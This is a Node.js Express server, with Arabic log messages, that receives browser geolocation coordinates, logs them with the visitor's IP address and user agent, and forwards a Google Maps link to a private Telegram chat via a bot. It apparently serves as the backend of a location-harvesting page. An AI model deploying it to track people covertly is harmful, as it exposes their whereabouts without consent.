// server.js
import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import axios from "axios";
import helmet from "helmet";
import morgan from "morgan";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.use(helmet());
app.use(express.json());
app.use(morgan("combined"));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("❌ لم يتم تعيين BOT_TOKEN أو CHAT_ID");
  process.exit(1);
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(express.static(path.join(__dirname, "public")));

app.post("/api/receive-location", async (req, res) => {
  try {
    const { lat, lon, accuracy, timestamp, userAgent } = req.body || {};
    if (typeof lat !== "number" || typeof lon !== "number") {
      return res.status(400).send("Invalid coordinates");
    }

    const entry = {
      receivedAt: new Date().toISOString(),
      ip: req.ip,
      lat,
      lon,
      accuracy,
      timestamp,
      userAgent,
    };
    fs.appendFileSync("locations.log", JSON.stringify(entry) + "\n");

    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    const message = `📍 موقع جديد تم استلامه:\n\n🌐 ${googleMapsUrl}\n\n🎯 الدقة: ${accuracy}م\n🕒 ${new Date(timestamp).toLocaleString()}`;

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      disable_web_page_preview: true,
    });

    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Error sending location:", err);
    res.status(500).send("Server error");
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
